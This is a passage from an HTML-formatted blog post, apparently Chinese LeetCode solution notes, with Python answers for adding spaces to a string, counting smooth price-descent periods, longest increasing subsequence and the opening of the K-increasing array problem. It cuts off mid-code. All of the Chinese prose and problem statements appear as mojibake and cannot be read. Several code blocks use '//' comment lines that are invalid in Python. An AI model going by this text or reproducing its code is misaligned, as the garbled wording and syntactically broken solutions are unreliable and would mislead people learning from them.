¼è¿æ¥å³å¯ã€‚è¿™é‡Œè¦æ³¨æ„<code>spaces</code>ç¬¬ä¸€ä¸ªä½ç½®å’Œæœ€åä¸€ä¸ªä½ç½®çš„å¤„ç†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addSpaces</span><span class="params">(self, s, spaces)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :type spaces: List[int]</span></span><br><span class="line"><span class="string">        :rtype: str</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(spaces)):</span><br><span class="line">          //å¤„ç†spacesç¬¬ä¸€ä¸ªä½ç½®</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                res.append(s[<span class="number">0</span>:spaces[<span class="number">0</span>]])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append(s[spaces[i<span class="number">-1</span>]:spaces[i]])</span><br><span class="line">        //å¤„ç†spacesæœ€åä¸€ä¸ªä½ç½®</span><br><span class="line">        <span class="keyword">if</span> spaces[<span class="number">-1</span>]&lt;len(s):</span><br><span class="line">            res.append(s[spaces[<span class="number">-1</span>]:])</span><br><span class="line">        <span class="keyword">return</span> <span class="string">" "</span>.join(res)</span><br></pre></td></tr></table></figure><h4 id="è‚¡ç¥¨å¹³æ»‘ä¸‹è·Œé˜¶æ®µçš„æ•°ç›®"><a href="#è‚¡ç¥¨å¹³æ»‘ä¸‹è·Œé˜¶æ®µçš„æ•°ç›®" class="headerlink" title="è‚¡ç¥¨å¹³æ»‘ä¸‹è·Œé˜¶æ®µçš„æ•°ç›®"></a>è‚¡ç¥¨å¹³æ»‘ä¸‹è·Œé˜¶æ®µçš„æ•°ç›®</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ prices ï¼Œè¡¨ç¤ºä¸€æ”¯è‚¡ç¥¨çš„å†å²æ¯æ—¥è‚¡ä»·ï¼Œå…¶ä¸­ prices[i] æ˜¯è¿™æ”¯è‚¡ç¥¨ç¬¬ i å¤©çš„ä»·æ ¼ã€‚</span><br><span class="line">ä¸€ä¸ª å¹³æ»‘ä¸‹é™çš„é˜¶æ®µ å®šä¹‰ä¸ºï¼šå¯¹äº è¿ç»­ä¸€å¤©æˆ–è€…å¤šå¤© ï¼Œæ¯æ—¥è‚¡ä»·éƒ½æ¯” å‰ä¸€æ—¥è‚¡ä»·æ°å¥½å°‘ 1 ï¼Œè¿™ä¸ªé˜¶æ®µç¬¬ä¸€å¤©çš„è‚¡ä»·æ²¡æœ‰é™åˆ¶ã€‚</span><br><span class="line">è¯·ä½ è¿”å› å¹³æ»‘ä¸‹é™é˜¶æ®µ çš„æ•°ç›®ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šprices = [3,2,1,4]</span><br><span class="line">è¾“å‡ºï¼š7</span><br><span class="line">è§£é‡Šï¼šæ€»å…±æœ‰ 7 ä¸ªå¹³æ»‘ä¸‹é™é˜¶æ®µï¼š</span><br><span class="line">[3], [2], [1], [4], [3,2], [2,1] å’Œ [3,2,1]</span><br><span class="line">æ³¨æ„ï¼Œä»…ä¸€å¤©æŒ‰ç…§å®šä¹‰ä¹Ÿæ˜¯å¹³æ»‘ä¸‹é™é˜¶æ®µã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šprices = [8,6,7,7]</span><br><span class="line">è¾“å‡ºï¼š4</span><br><span class="line">è§£é‡Šï¼šæ€»å…±æœ‰ 4 ä¸ªè¿ç»­å¹³æ»‘ä¸‹é™é˜¶æ®µï¼š[8], [6], [7] å’Œ [7]</span><br><span class="line">ç”±äº 8 - 6 â‰  1 ï¼Œæ‰€ä»¥ [8,6] ä¸æ˜¯å¹³æ»‘ä¸‹é™é˜¶æ®µã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šprices = [1]</span><br><span class="line">è¾“å‡ºï¼š1</span><br><span class="line">è§£é‡Šï¼šæ€»å…±æœ‰ 1 ä¸ªå¹³æ»‘ä¸‹é™é˜¶æ®µï¼š[1]</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æ€è·¯ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œé¦–å…ˆæˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹ï¼Œå¯¹äºè¿ç»­1å¤©ï¼Œåˆ™å¯ä»¥å¾—åˆ°å¹³æ»‘ä¸‹é™çš„é˜¶æ®µæ˜¯1ä¸ªï¼Œå¯¹äºè¿ç»­2å¤©ï¼Œåˆ™å¯ä»¥å¾—åˆ°å¹³æ»‘ä¸‹é™çš„é˜¶æ®µæ˜¯3ä¸ªï¼Œå‡å¦‚<code>prices=[2,1]</code>ï¼Œåˆ™é˜¶æ®µå€¼ä¸º<code>[2],[1],[2,1]</code>ï¼Œå¯¹äºè¿ç»­3å¤©ï¼Œåˆ™å¯ä»¥å¾—åˆ°å¹³æ»‘ä¸‹é™çš„é˜¶æ®µæ˜¯6ä¸ªï¼Œå‡å¦‚<code>prices=[3,2,1]</code>ï¼Œåˆ™é˜¶æ®µå€¼ä¸º<code>[3],[2],[1],[3,2],[2,1],[3,2,1]</code>ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°è§„å¾‹ï¼Œå¯¹äºè¿ç»­nå¤©ï¼Œå¹³æ»‘ä¸‹é™çš„é˜¶æ®µæ˜¯<code>1+2+...+n</code>çš„å€¼ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¾æ¬¡éå†<code>prices</code>ä¸­çš„å€¼ï¼Œæ‰¾åˆ°æ¯ä¸€ä¸ªè¿ç»­å¹³æ»‘é˜¶æ®µï¼Œå¹¶æ ¹æ®æ¯ä¸€ä¸ªé˜¶æ®µä¸­çš„å€¼è®¡ç®—æ•°ç›®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getDescentPeriods</span><span class="params">(self, prices)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> len(prices) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        res = []</span><br><span class="line">        tmp=[]</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        i=<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(prices):</span><br><span class="line">          //å¦‚æœå‰ä¸€ä¸ªæ¯”åä¸€ä¸ªå¤š<span class="number">1</span>ï¼Œåˆ™ä»–ä»¬å±äºä¸€ä¸ªå¹³æ»‘é˜¶æ®µ</span><br><span class="line">            <span class="keyword">if</span> prices[i<span class="number">-1</span>]-prices[i] == <span class="number">1</span>:</span><br><span class="line">                tmp.append(prices[i<span class="number">-1</span>])</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">              //è¿™é‡Œå› ä¸ºå‰ä¸€ä¸ªå€¼è¿˜æ²¡æœ‰åŠ å…¥åˆ°tmpä¸­ï¼Œå› æ­¤å…ˆæ·»åŠ å‰ä¸€ä¸ªå€¼</span><br><span class="line">                tmp.append(prices[i<span class="number">-1</span>])</span><br><span class="line">                ////å…ˆæŠŠä¹‹å‰çš„å¹³æ»‘é˜¶æ®µä¿å­˜èµ·æ¥</span><br><span class="line">                res.append(tmp)</span><br><span class="line">                //åˆ¤æ–­åç»­çš„å¹³æ»‘é˜¶æ®µï¼Œå› æ­¤tmpç½®ä¸ºç©º</span><br><span class="line">                tmp=[]</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> tmp:</span><br><span class="line">          //å¦‚æœtmpä¸­æœ‰å€¼ï¼Œé‚£è¯´æ˜æœ€åä¸€æ®µæ²¡æœ‰åŠ å…¥åˆ°resä¸­</span><br><span class="line">            res.append(tmp)</span><br><span class="line">        //å¦‚æœpricesä¸­æœ€åä¸€ä¸ªå€¼æ¯”å€’æ•°ç¬¬äºŒä¸ªå€¼å°<span class="number">1</span>ï¼Œåˆ™æœ€åä¸€ä¸ªå€¼å±äºå€’æ•°ç¬¬äºŒä¸ªtmpå¹³æ»‘é˜¶æ®µ</span><br><span class="line">        <span class="keyword">if</span> prices[<span class="number">-2</span>] - prices[<span class="number">-1</span>] == <span class="number">1</span>:</span><br><span class="line">            res[<span class="number">-1</span>].append(prices[<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          //å¦åˆ™çš„è¯æœ€åä¸€ä¸ªå€¼å•ç‹¬ç»„æˆä¸€ä¸ªå¹³æ»‘é˜¶æ®µ</span><br><span class="line">            res.append([prices[<span class="number">-1</span>]])</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">          //è®¡ç®—ç´¯åŠ å’Œ</span><br><span class="line">          result += (<span class="number">1</span>+len(r))*len(r)/<span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>åšæœ€åè¿™é“é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆåšä¸€ä¸‹<code>Leetcode</code>ç¬¬300é¢˜ï¼Œæœ€é•¿é€’å¢å­åºåˆ—ã€‚</p><h4 id="æœ€é•¿é€’å¢å­åºåˆ—"><a href="#æœ€é•¿é€’å¢å­åºåˆ—" class="headerlink" title="æœ€é•¿é€’å¢å­åºåˆ—"></a>æœ€é•¿é€’å¢å­åºåˆ—</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œæ‰¾åˆ°å…¶ä¸­æœ€é•¿ä¸¥æ ¼é€’å¢å­åºåˆ—çš„é•¿åº¦ã€‚</span><br><span class="line">å­åºåˆ—æ˜¯ç”±æ•°ç»„æ´¾ç”Ÿè€Œæ¥çš„åºåˆ—ï¼Œåˆ é™¤ï¼ˆæˆ–ä¸åˆ é™¤ï¼‰æ•°ç»„ä¸­çš„å…ƒç´ è€Œä¸æ”¹å˜å…¶ä½™å…ƒç´ çš„é¡ºåºã€‚ä¾‹å¦‚ï¼Œ[3,6,2,7] æ˜¯æ•°ç»„ [0,3,1,6,2,2,7] çš„å­åºåˆ—ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [10,9,2,5,3,7,101,18]</span><br><span class="line">è¾“å‡ºï¼š4</span><br><span class="line">è§£é‡Šï¼šæœ€é•¿é€’å¢å­åºåˆ—æ˜¯ [2,3,7,101]ï¼Œå› æ­¤é•¿åº¦ä¸º 4 ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [0,1,0,3,2,3]</span><br><span class="line">è¾“å‡ºï¼š4</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [7,7,7,7,7,7,7]</span><br><span class="line">è¾“å‡ºï¼š1</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜è¦æ‰¾çš„æ˜¯ä¸¥æ ¼é€’å¢çš„å­åºåˆ—ï¼Œæˆ‘ä»¬é¦–å…ˆæ¥æ ¹æ®åŠ¨æ€è§„åˆ’çš„æ€è·¯èµ°ä¸€éã€‚</p><p>å¦‚æœ<code>nums</code>çš„é•¿åº¦æ˜¯1ï¼Œé‚£ä¹ˆä¸ç”¨è€ƒè™‘ï¼Œç›´æ¥è¿”å›1å³å¯ã€‚</p><ul><li>ä»<code>nums</code>çš„é•¿åº¦å¤§äºç­‰äº2å¼€å§‹ï¼Œé¦–å…ˆæˆ‘ä»¬è¦åˆå§‹åŒ–ä¸€ä¸ª<code>dpæ•°ç»„</code>ã€‚è¿™ä¸ªæ•°ç»„çš„åˆå€¼å¯ä»¥å…¨éƒ¨è®¾ç½®ä¸º1ï¼Œå› ä¸ºæœ€çŸ­çš„å­åºåˆ—é•¿åº¦ä¹Ÿæ˜¯1ã€‚</li><li>ä»ç¬¬2ä¸ªå€¼å¼€å§‹éå†ï¼Œä¾æ¬¡æ¯”è¾ƒå½“å‰å€¼ä¹‹å‰çš„æ‰€æœ‰å€¼ï¼Œä»è€Œæ›´æ–°å½“å‰å€¼ä¹‹å‰çš„æœ€é•¿å­åºåˆ—é•¿åº¦ï¼Œæ›´æ–°åˆ°<code>dp[i]</code>ä¸­</li><li>è®¾ç½®ä¸€ä¸ªå…¨å±€çš„å€¼ï¼Œç”¨æ¥ä¿å­˜æœ€é•¿å­åºåˆ—çš„é•¿åº¦</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment">#åŠ¨æ€è§„åˆ’</span></span><br><span class="line">        <span class="keyword">if</span> len(nums) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> len(nums)</span><br><span class="line">        <span class="comment">#åˆå§‹åŒ–dpæ•°ç»„ï¼Œå…¶ä¸­dp[i]è¡¨ç¤ºiä¹‹å‰åŒ…å«içš„æœ€é•¿ä¸Šå‡å­åºåˆ—çš„é•¿åº¦</span></span><br><span class="line">        dp = [<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums))]</span><br><span class="line">        <span class="comment">#ç”¨æ¥ä¿å­˜æœ€å¤§å€¼</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(i):</span><br><span class="line">                <span class="comment">#å¦‚æœå½“å‰içš„å€¼å¤§äºiä¹‹å‰çš„å€¼</span></span><br><span class="line">                <span class="keyword">if</span> nums[i] &gt; nums[j]:</span><br><span class="line">                    <span class="comment">#åˆ™å¯¹å½“å‰dp[i]ä¸­çš„å€¼è¿›è¡Œæ›´æ–°</span></span><br><span class="line">                    dp[i] = max(dp[i],dp[j]+<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#å¦‚æœå½“å‰dp[i]çš„å€¼å¤§äºresçš„å€¼ï¼Œåˆ™æ›´æ–°res</span></span><br><span class="line">            <span class="keyword">if</span> dp[i] &gt; res:</span><br><span class="line">                res = dp[i]</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§åšæ³•ï¼Œé€šè¿‡<code>bisect</code>æ¨¡å—å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLIS</span><span class="params">(self, nums)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        dp = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> nums:</span><br><span class="line">          <span class="comment">#å› ä¸ºè¦æ±‚å¾—æ˜¯ä¸¥æ ¼é€’å¢çš„ï¼Œå› æ­¤è¿™é‡Œé‡åˆ°é‡å¤çš„å€¼ç›´æ¥è·³è¿‡</span></span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">in</span> dp:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment">#æ‰¾åˆ°å½“å‰å€¼åœ¨dpä¸­åº”è¯¥æ’å…¥çš„ä½ç½®</span></span><br><span class="line">            pos = bisect.bisect(dp, x)</span><br><span class="line">            <span class="comment">#è¿™é‡Œä¼šæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯dpä¸ºç©ºï¼Œä¸€ç§æ˜¯posåº”è¯¥æ’å…¥åˆ°dpä¸­æœ€åä¸€ä¸ªä½ç½®</span></span><br><span class="line">            <span class="keyword">if</span> pos == len(dp):</span><br><span class="line">                dp.append(x)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">              <span class="comment">#è¿™ç§æƒ…å†µè¯´æ˜posåº”è¯¥æ’å…¥åˆ°dpä¸­é—´ä½ç½®ã€‚</span></span><br><span class="line">                dp[pos] = x</span><br><span class="line">        <span class="keyword">return</span> len(dp)</span><br></pre></td></tr></table></figure><h4 id="ä½¿æ•°ç»„-K-é€’å¢çš„æœ€å°‘æ“ä½œæ¬¡æ•°"><a href="#ä½¿æ•°ç»„-K-é€’å¢çš„æœ€å°‘æ“ä½œæ¬¡æ•°" class="headerlink" title="ä½¿æ•°ç»„ K é€’å¢çš„æœ€å°‘æ“ä½œæ¬¡æ•°"></a>ä½¿æ•°ç»„ K é€’å¢çš„æœ€å°‘æ“ä½œæ¬¡æ•°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ç»™ä½ ä¸€ä¸ªä¸‹æ ‡ä» 0 å¼€å§‹åŒ…å« n ä¸ªæ­£æ•´æ•°çš„æ•°ç»„ arr ï¼Œå’Œä¸€ä¸ªæ­£æ•´æ•° k ã€‚</span><br><span class="line">å¦‚æœå¯¹äºæ¯ä¸ªæ»¡è¶³ k &lt;= i &lt;= n-1 çš„ä¸‹æ ‡ i ï¼Œéƒ½æœ‰ arr[i-k] &lt;= arr[i] ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç§° arr æ˜¯ K é€’å¢ çš„ã€‚</span><br><span class="line">æ¯”æ–¹è¯´ï¼Œarr = [4, 1, 5, 2, 6, 2] å¯¹äº k = 2 æ˜¯ K é€’å¢çš„ï¼Œå› ä¸ºï¼š</span><br><span class="line">arr[0] &lt;= arr[2] (4 &lt;= 5)</span><br><span class="line">arr[1] &lt;= arr[3] (1 &lt;= 2)</span><br><span class="line">arr[2] &lt;= arr[4] (5 &lt;= 6)</span><br><span class="line">arr[3] &lt;= arr[5] (2 &lt;= 2)</span><br><span class="line">ä½†æ˜¯ï¼Œç›¸åŒçš„æ•°ç»„ arr å¯¹äº k = 1 ä¸æ˜¯ K é€’å¢çš„ï¼ˆå› ä¸º arr[0] &gt; arr[1]ï¼‰ï¼Œå¯¹äº k = 3 ä¹Ÿä¸æ˜¯ K é€’å¢çš„ï¼ˆå› ä¸º arr[0] &gt; arr[3] ï¼‰ã€‚</span><br><span class="line">æ¯ä¸€æ¬¡ æ“ä½œ ä¸­ï¼Œä½ å¯ä»¥é€‰æ‹©ä¸€ä¸ªä¸‹æ ‡ i å¹¶å°† arr[i] æ”¹æˆä»»æ„ æ­£æ•´æ•°ã€‚</span><br><span class="line">è¯·ä½ è¿”å›å¯¹äºç»™å®šçš„ k ï¼Œä½¿æ•°ç»„å˜æˆ K é€’å¢çš„ æœ€å°‘æ“ä½œæ¬¡æ•° ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šarr = [5,4,3,2,1], k = 1</span><br><span class="line">è¾“å‡ºï¼š4</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">å¯¹äº k = 1 ï¼Œæ•°ç»„æœ€ç»ˆå¿…é¡»å˜æˆéé€’å‡çš„ã€‚</span><br><span class="line">å¯è¡Œçš„ K é€’å¢ç»“æœæ•°ç»„ä¸º [5,6,7,8,9]ï¼Œ[1,1,1,1,1]ï¼Œ[2,2,3,4,4] ã€‚å®ƒä»¬éƒ½éœ€è¦ 4 æ¬¡æ“ä½œã€‚</span><br><span class="line">æ¬¡ä¼˜è§£æ˜¯å°†æ•°ç»„å˜æˆæ¯”æ–¹è¯´ [6,7,8,9,10] ï¼Œå› ä¸ºéœ€è¦ 5 æ¬¡æ“ä½œã€‚</span><br><span class="line">æ˜¾ç„¶æˆ‘ä»¬æ— æ³•ä½¿ç”¨å°‘äº 4 æ¬¡æ“ä½œå°†æ•°ç»„å˜æˆ K é€’å¢çš„ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šarr = [4,1,5,2,6,2], k = 2</span><br><span class="line">è¾“å‡ºï¼š0</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">è¿™æ˜¯é¢˜ç›®æè¿°ä¸­çš„ä¾‹å­ã€‚</span><br><span class="line">å¯¹äºæ¯ä¸ªæ»¡è¶³ 2 &lt;= i &lt;= 5 çš„ä¸‹æ ‡ i ï¼Œæœ‰ arr[i-2] &lt;= arr[i] ã€‚</span><br><span class="line">ç”±äºç»™å®šæ•°ç»„å·²ç»æ˜¯ K é€’å¢çš„ï¼Œæˆ‘ä»¬ä¸éœ€è¦è¿›è¡Œä»»ä½•æ“ä½œã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šarr = [4,1,5,2,6,2], k = 3</span><br><span class="line">è¾“å‡ºï¼š2</span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">ä¸‹æ ‡ 3 å’Œ 5 æ˜¯ä»…æœ‰çš„ 3 &lt;= i &lt;= 5 ä¸”ä¸æ»¡è¶³ arr[i-3] &lt;= arr[i] çš„ä¸‹æ ‡ã€‚</span><br><span class="line">å°†æ•°ç»„å˜æˆ K é€’å¢çš„æ–¹æ³•ä¹‹ä¸€æ˜¯å°† arr[3] å˜ä¸º 4 ï¼Œä¸”å°† arr[5] å˜æˆ 5 ã€‚</span><br><span class="line">æ•°ç»„å˜ä¸º [4,1,5,4,6,5] ã€‚</span><br><span class="line">å¯èƒ½æœ‰å…¶ä»–æ–¹æ³•å°†æ•°ç»„å˜ä¸º K é€’å¢çš„ï¼Œä½†æ²¡æœ‰ä»»ä½•ä¸€ç§æ–¹æ³•éœ€è¦çš„æ“ä½œæ¬¡æ•°å°äº 2 æ¬¡ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å’Œ<code>Leetcode</code>ç¬¬300é¢˜æœ‰äº›ç±»ä¼¼ï¼Œåªä¸è¿‡è¿™é‡Œé¢åŠ äº†ä¸€ä¸ªKé€’å¢çš„æ¦‚å¿µã€‚è€Œä¸”è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œé¢æ²¡æœ‰è¦æ±‚ä¸¥æ ¼é€’å¢ã€‚æ‰€ä»¥è¿™é“é¢˜æˆ‘ä»¬å¯ä»¥åˆ†ä¸‰æ­¥èµ°</p><ul><li>é¦–å…ˆå°†æ•°ç»„åˆ†ä¸ºkç»„</li><li>å¯¹kç»„ä¸­çš„æ¯ä¸ªæ•°ç»„éå†ï¼Œæ±‚è§£æ¯ä¸ªæ•°ç»„çš„æœ€é•¿å­åºåˆ—</li><li>è¿™kç»„ä¸­çš„æ¯ä¸ªæ•°ç»„é•¿åº¦å‡å»æ¯ä¸ªæ•°ç»„çš„æœ€é•¿å­åºåˆ—å°±å¯ä»¥å¾—åˆ°æ¯ä¸ªæ•°ç»„éœ€è¦ä¿®æ”¹çš„æœ€å°‘æ“ä½œæ•°</li></ul><p>æœ€ç»ˆå°†kç»„ä¸­æ¯ä¸ªæ•°ç»„å˜ä¸ºéé€’å‡éœ€è¦çš„æœ€å°‘æ“ä½œæ•°ç›¸åŠ å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kIncreasing</span><span class="params">(self, arr, k)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type arr: List[int]</span></span><br><span class="line"><span class="string">        :type k: int</span></span><br><span class="line"><span class="string">        